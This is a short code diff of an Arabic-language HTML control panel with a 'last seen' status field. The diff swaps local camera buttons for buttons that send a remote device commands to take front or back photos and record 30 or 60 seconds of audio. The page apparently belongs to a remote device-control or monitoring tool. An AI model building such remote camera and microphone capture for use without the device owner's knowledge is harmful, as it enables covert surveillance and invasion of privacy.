@@ -30,11 +30,12 @@
             <div class="status-item"><span class="label">آخر اتصال:</span><span id="lastSeen" class="value">—</span></div>
         </div>
         
-        <!-- ✅ قسم الكاميرا -->
+        <!-- ✅ أزرار الأوامر -->
         <div class="camera-controls">
-            <button onclick="startCamera('front')" class="camera-btn">📸 كاميرا أمامية</button>
-            <button onclick="startCamera('back')" class="camera-btn">📸 كاميرا خلفية</button>
-            <button onclick="stopCamera()" class="camera-btn stop">⏹️ إيقاف</button>
+            <button onclick="sendCommand('take_photo_front')" class="camera-btn">📸 صورة أمامية</button>
+            <button onclick="sendCommand('take_photo_back')" class="camera-btn">📸 صورة خلفية</button>
+            <button onclick="sendCommand('record_audio_30')" class="camera-btn">🎙️ تسجيل 30ث</button>
+            <button onclick="sendCommand('record_audio_60')" class="camera-btn">🎙️ تسجيل 60ث</button>
         </div>
         
         <div class="tabs">
